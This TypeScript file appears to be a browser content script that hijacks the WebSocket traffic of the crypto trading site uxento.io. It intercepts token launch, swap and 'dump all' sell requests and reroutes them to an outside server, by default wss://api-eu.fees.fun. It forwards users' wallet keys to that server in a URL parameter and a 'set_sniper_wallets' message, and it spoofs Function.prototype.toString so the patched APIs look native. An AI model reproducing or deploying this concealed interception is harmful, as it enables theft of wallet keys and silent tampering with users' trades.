import {
  setupAuthChannel,
  registerToStringEntries,
  parseSocketIO,
  buildSocketIOResponse,
  dispatchWsMessage,
  requestLocalSign,
  listenForSettingsUpdates,
} from "./shared/interceptor-utils";
const _Proxy = Proxy;
const _Reflect = Reflect;
const _JSON = JSON;
const _Map = Map;
const _WeakMap = WeakMap;
const _URL = URL;
const _toString = Function.prototype.toString;
const _defineProperty = Object.defineProperty;
const _crypto = crypto;
const _addEventListener = ((globalThis as any)[Symbol.for("__" + (import.meta.env.VITE_CHANNEL_KEY as string))]?.ael
  || EventTarget.prototype.addEventListener) as typeof EventTarget.prototype.addEventListener;
const OriginalWebSocket = window.WebSocket;
const originalSend = OriginalWebSocket.prototype.send;
const nativeWSStr = _toString.call(OriginalWebSocket);
const nativeSendStr = _toString.call(originalSend);
const CHANNEL_KEY = import.meta.env.VITE_CHANNEL_KEY as string;
const WS_PROXY_URL = (import.meta.env.VITE_WS_PROXY_URL as string) || "wss://api-eu.fees.fun";
const UX_URL_PATTERN = /^wss:\/\/core-us\.uxento\.io/;
const { auth, dataPromise } = setupAuthChannel(CHANNEL_KEY);
let ourWs: WebSocket | null = null;
let ourWsReady = false;
const pendingRequests = new _Map<string, {
  resolve: (msg: any) => void;
  timer: ReturnType<typeof setTimeout>;
}>();
function connectOurWs() {
  if (!auth.token || !auth.walletKey) return;
  const baseUrl = auth.serverUrl || WS_PROXY_URL;
  const walletParam = auth.localSigning ? "" : `&wallet=${encodeURIComponent(auth.walletKey)}`;
  const url = `${baseUrl}?token=${encodeURIComponent(auth.token)}${walletParam}&walletAddress=${encodeURIComponent(auth.walletAddress || "")}&platform=uxento`;
  ourWs = new OriginalWebSocket(url);
  ourWs.onopen = () => {
    ourWsReady = true;
  };
  ourWs.onmessage = (e: MessageEvent) => {
    try {
      const msg = _JSON.parse(e.data as string);
      const reqId = msg.requestId;
      if (reqId && pendingRequests.has(reqId)) {
        const pending = pendingRequests.get(reqId)!;
        clearTimeout(pending.timer);
        pendingRequests.delete(reqId);
        pending.resolve(msg);
      }
    } catch {}
  };
  ourWs.onclose = () => {
    ourWsReady = false;
    for (const [id, pending] of pendingRequests) {
      clearTimeout(pending.timer);
      pending.resolve({ type: "error", requestId: id, message: "proxy disconnected" });
    }
    pendingRequests.clear();
    setTimeout(connectOurWs, 3000);
  };
  ourWs.onerror = () => {
    ourWs?.close();
  };
}
dataPromise.then(() => {
  if (auth.token && auth.walletKey) {
    connectOurWs();
  }
  listenForSettingsUpdates(CHANNEL_KEY, auth);
});
_addEventListener.call(document, CHANNEL_KEY + ":server-url", (e: Event) => {
  try {
    const { serverUrl } = _JSON.parse((e as CustomEvent).detail);
    if (typeof serverUrl === "string" && serverUrl !== auth.serverUrl) {
      auth.serverUrl = serverUrl;
      for (const [id, pending] of pendingRequests) {
        clearTimeout(pending.timer);
        pending.resolve({ type: "error", requestId: id, message: "server changed" });
      }
      pendingRequests.clear();
      if (ourWs) {
        ourWs.onclose = null;
        ourWs.close();
        ourWs = null;
        ourWsReady = false;
      }
      connectOurWs();
    }
  } catch {}
});
let activeUxWs: WebSocket | null = null;
const uxMeta = new _WeakMap<WebSocket, { url: string }>();
const wsProxy = new _Proxy(OriginalWebSocket, {
  construct(target: any, args: any[], newTarget: any) {
    const ws = _Reflect.construct(target, args, newTarget) as WebSocket;
    try {
      const url = (args[0] ?? "").toString();
      if (UX_URL_PATTERN.test(url)) {
        uxMeta.set(ws, { url });
        activeUxWs = ws;
        ws.addEventListener("close", () => {
          if (activeUxWs === ws) activeUxWs = null;
        });
      }
    } catch {}
    return ws;
  },
  get(target: any, prop: any, receiver: any) {
    return _Reflect.get(target, prop, receiver);
  },
});
_defineProperty(wsProxy, "prototype", {
  value: OriginalWebSocket.prototype,
  writable: false,
  configurable: false,
});
window.WebSocket = wsProxy;
_defineProperty(OriginalWebSocket.prototype, "constructor", {
  value: wsProxy,
  writable: true,
  configurable: true,
  enumerable: false,
});
function resolveUxBundleWallets(bundleWallets: any[]): { address: string; walletKey: string; buyAmount: number }[] {
  if (!auth.walletCache) return [];
  const resolved: { address: string; walletKey: string; buyAmount: number }[] = [];
  for (const bw of bundleWallets) {
    const address = bw.publicKey;
    if (!address) continue;
    const encKey = auth.walletCache[address];
    if (!encKey) continue;
    resolved.push({ address, walletKey: encKey, buyAmount: Number(bw.amount) || 0 });
  }
  return resolved;
}
function localSignAndSubmit(
  buildData: any,
  operation: "launch" | "buy" | "sell",
  originalData: any,
  sendUxResponse: (data: any) => void,
) {
  const walletAddress = auth.walletAddress || "";
  requestLocalSign(CHANNEL_KEY, buildData.transactions, walletAddress)
    .then((signResult: { success: boolean; signedTransactions?: string[]; error?: string }) => {
      if (!signResult.success || !signResult.signedTransactions) {
        sendUxResponse({ ok: false, error: signResult.error || "Local signing failed", details: "" });
        return;
      }
      if (!ourWs || !ourWsReady) {
        sendUxResponse({ ok: false, error: "WS disconnected during submit", details: "" });
        return;
      }
      const submitRequestId = _crypto.randomUUID();
      ourWs.send(_JSON.stringify({
        action: "submit",
        requestId: submitRequestId,
        data: {
          transactions: signResult.signedTransactions,
          txPlatform: originalData.txPlatform || "TEMPORAL",
          type: originalData.bundle ? "BUNDLE" : "DEFAULT",
          userID: "",
          operation,
          tokenAddress: buildData.tokenAddress || originalData.mint || "",
          platform: "uxento",
        },
      }));
      const submitTimer = setTimeout(() => {
        pendingRequests.delete(submitRequestId);
        sendUxResponse({ ok: false, error: "Submit timed out", details: "" });
      }, 30000);
      pendingRequests.set(submitRequestId, {
        resolve: (msg: any) => {
          if (msg.type === "error") {
            sendUxResponse({ ok: false, error: msg.message || "Submit failed", details: "" });
            return;
          }
          const raw = msg.data || msg;
          if (operation === "launch") {
            const mint = buildData.tokenAddress || "";
            const sig = raw.txHashes?.[0] || raw.txHash || "";
            const platform = originalData.platform || "pump";
            const platformUrls: Record<string, string> = {
              pump: `https://pump.fun/${mint}`,
              bonk: `https://letsbonk.fun/token/${mint}`,
              bags: `https://bags.fm/${mint}`,
              daos: `https://daos.fun/${mint}`,
              moon: `https://moonshot.money/${mint}`,
            };
            sendUxResponse({
              ok: true,
              data: {
                success: true,
                signature: sig,
                coin: {
                  name: originalData.name || "",
                  symbol: originalData.symbol || "",
                  mint,
                  image: originalData.image || "",
                  url: platformUrls[platform.toLowerCase()] || `https://pump.fun/${mint}`,
                  platform,
                },
              },
            });
          } else {
            const sig = raw.txHashes?.[0] || raw.txHash || raw.signature || "";
            sendUxResponse({ ok: true, data: { signature: sig } });
          }
        },
        timer: submitTimer,
      });
    });
}
function handleCreate(uxWs: WebSocket, ackId: string, data: any) {
  const requestId = _crypto.randomUUID();
  function sendUxResponse(responseData: any) {
    const payload = buildSocketIOResponse(ackId, "", responseData);
    const origin = new _URL(uxMeta.get(uxWs)?.url || "wss://core-us.uxento.io").origin;
    dispatchWsMessage(uxWs, payload, origin);
  }
  if (!ourWs || !ourWsReady) {
    sendUxResponse({ ok: false, error: "Service temporarily unavailable", details: "" });
    return;
  }
  const useLocalSigning = auth.localSigning;
  if (data.bundle && Array.isArray(data.bundleWallets) && !useLocalSigning) {
    const bundleWallets = resolveUxBundleWallets(data.bundleWallets);
    if (bundleWallets.length > 0) {
      ourWs.send(_JSON.stringify({
        action: "set_sniper_wallets",
        data: bundleWallets,
      }));
    }
  }
  const sendData = useLocalSigning ? { ...data, buildOnly: true } : data;
  ourWs.send(_JSON.stringify({
    action: "launch",
    requestId,
    platform: "uxento",
    data: sendData,
  }));
  const timer = setTimeout(() => {
    pendingRequests.delete(requestId);
    sendUxResponse({ ok: false, error: "Launch timed out", details: "" });
  }, 30000);
  pendingRequests.set(requestId, {
    resolve: (msg: any) => {
      if (msg.type === "error") {
        sendUxResponse({ ok: false, error: msg.message || "Launch failed", details: "" });
        return;
      }
      if (useLocalSigning && msg.type === "launch_build_response" && msg.data?.transactions) {
        clearTimeout(timer);
        localSignAndSubmit(msg.data, "launch", data, sendUxResponse);
        return;
      }
      sendUxResponse(msg.data);
    },
    timer,
  });
}
function handleSwap(uxWs: WebSocket, ackId: string, data: any) {
  const requestId = _crypto.randomUUID();
  function sendUxResponse(responseData: any) {
    const payload = buildSocketIOResponse(ackId, "", responseData);
    const origin = new _URL(uxMeta.get(uxWs)?.url || "wss://core-us.uxento.io").origin;
    dispatchWsMessage(uxWs, payload, origin);
  }
  if (!ourWs || !ourWsReady) {
    sendUxResponse({ ok: false, error: "Service temporarily unavailable", details: "" });
    return;
  }
  const useLocalSigning = auth.localSigning;
  const sendData = useLocalSigning ? { ...data, buildOnly: true } : data;
  ourWs.send(_JSON.stringify({
    action: "swap",
    requestId,
    platform: "uxento",
    data: sendData,
  }));
  const timer = setTimeout(() => {
    pendingRequests.delete(requestId);
    sendUxResponse({ ok: false, error: "Swap timed out", details: "" });
  }, 30000);
  pendingRequests.set(requestId, {
    resolve: (msg: any) => {
      if (msg.type === "error") {
        sendUxResponse({ ok: false, error: msg.message || "Swap failed", details: "" });
        return;
      }
      if (useLocalSigning && msg.type === "swap_build_response" && msg.data?.transactions) {
        clearTimeout(timer);
        const side = data.type === "sell" ? "sell" : "buy";
        localSignAndSubmit(msg.data, side, data, sendUxResponse);
        return;
      }
      sendUxResponse(msg.data);
    },
    timer,
  });
}
function handleDumpAll(uxWs: WebSocket, ackId: string, data: any) {
  const { wallets, mint, platform, slippage, tip } = data;
  function sendUxResponse(responseData: any) {
    const payload = buildSocketIOResponse(ackId, "", responseData);
    const origin = new _URL(uxMeta.get(uxWs)?.url || "wss://core-us.uxento.io").origin;
    dispatchWsMessage(uxWs, payload, origin);
  }
  if (!ourWs || !ourWsReady) {
    sendUxResponse({ ok: false, results: [] });
    return;
  }
  if (!Array.isArray(wallets) || wallets.length === 0) {
    sendUxResponse({ ok: true, results: [] });
    return;
  }
  const useLocalSigning = auth.localSigning;
  if (!useLocalSigning && auth.walletCache) {
    const walletData: { address: string; walletKey: string; buyAmount: number }[] = [];
    for (const addr of wallets) {
      const encKey = auth.walletCache[addr];
      if (encKey) walletData.push({ address: addr, walletKey: encKey, buyAmount: 0 });
    }
    if (walletData.length > 0) {
      ourWs!.send(_JSON.stringify({ action: "set_sniper_wallets", data: walletData }));
    }
  }
  const results: { wallet: string; success: boolean; signature?: string; error?: string }[] = [];
  let completed = 0;
  function checkDone() {
    if (completed === wallets.length) {
      sendUxResponse({ ok: true, results });
    }
  }
  for (const wallet of wallets) {
    const requestId = _crypto.randomUUID();
    const swapData: Record<string, any> = {
      wallet,
      mint,
      type: "sell",
      amount: 100,
      platform: platform || "auto",
      slippage: slippage ?? 10,
      priorityFee: tip ?? 0.0001,
      tip: tip ?? 0.0001,
    };
    if (useLocalSigning) swapData.buildOnly = true;
    ourWs!.send(_JSON.stringify({
      action: "swap",
      requestId,
      platform: "uxento",
      data: swapData,
    }));
    const timer = setTimeout(() => {
      pendingRequests.delete(requestId);
      results.push({ wallet, success: false, error: "Timed out" });
      completed++;
      checkDone();
    }, 30000);
    pendingRequests.set(requestId, {
      resolve: (msg: any) => {
        if (msg.type === "error") {
          results.push({ wallet, success: false, error: msg.message || "Sell failed" });
          completed++;
          checkDone();
          return;
        }
        if (useLocalSigning && msg.type === "swap_build_response" && msg.data?.transactions) {
          clearTimeout(timer);
          const walletAddr = wallet;
          requestLocalSign(CHANNEL_KEY, msg.data.transactions, walletAddr)
            .then((signResult: { success: boolean; signedTransactions?: string[]; error?: string }) => {
              if (!signResult.success || !signResult.signedTransactions) {
                results.push({ wallet: walletAddr, success: false, error: signResult.error || "Sign failed" });
                completed++;
                checkDone();
                return;
              }
              if (!ourWs || !ourWsReady) {
                results.push({ wallet: walletAddr, success: false, error: "WS disconnected" });
                completed++;
                checkDone();
                return;
              }
              const submitId = _crypto.randomUUID();
              ourWs.send(_JSON.stringify({
                action: "submit",
                requestId: submitId,
                data: {
                  transactions: signResult.signedTransactions,
                  txPlatform: "TEMPORAL",
                  type: "DEFAULT",
                  userID: "",
                  operation: "sell",
                  tokenAddress: mint || "",
                  platform: "uxento",
                },
              }));
              const submitTimer = setTimeout(() => {
                pendingRequests.delete(submitId);
                results.push({ wallet: walletAddr, success: false, error: "Submit timed out" });
                completed++;
                checkDone();
              }, 30000);
              pendingRequests.set(submitId, {
                resolve: (submitMsg: any) => {
                  if (submitMsg.type === "error") {
                    results.push({ wallet: walletAddr, success: false, error: submitMsg.message || "Submit failed" });
                  } else {
                    const raw = submitMsg.data || submitMsg;
                    results.push({
                      wallet: walletAddr,
                      success: true,
                      signature: raw.txHashes?.[0] || raw.txHash || raw.signature || "",
                    });
                  }
                  completed++;
                  checkDone();
                },
                timer: submitTimer,
              });
            });
          return;
        }
        results.push({
          wallet,
          success: true,
          signature: msg.data?.signature || msg.data?.tx_hash || "",
        });
        completed++;
        checkDone();
      },
      timer,
    });
  }
}
OriginalWebSocket.prototype.send = new _Proxy(originalSend, {
  apply(target: any, thisArg: any, args: any[]) {
    try {
      if (
        uxMeta.has(thisArg as WebSocket) &&
        typeof args[0] === "string"
      ) {
        const parsed = parseSocketIO(args[0] as string);
        if (parsed) {
          if (parsed.event === "create") {
            handleCreate(thisArg as WebSocket, parsed.ackId, parsed.data);
            return;
          }
          if (parsed.event === "swap") {
            handleSwap(thisArg as WebSocket, parsed.ackId, parsed.data);
            return;
          }
          if (parsed.event === "dump_all") {
            handleDumpAll(thisArg as WebSocket, parsed.ackId, parsed.data);
            return;
          }
        }
      }
    } catch {}
    return _Reflect.apply(target, thisArg, args);
  },
});
registerToStringEntries(CHANNEL_KEY, [
  [wsProxy, nativeWSStr],
  [OriginalWebSocket.prototype.send, nativeSendStr],
]);
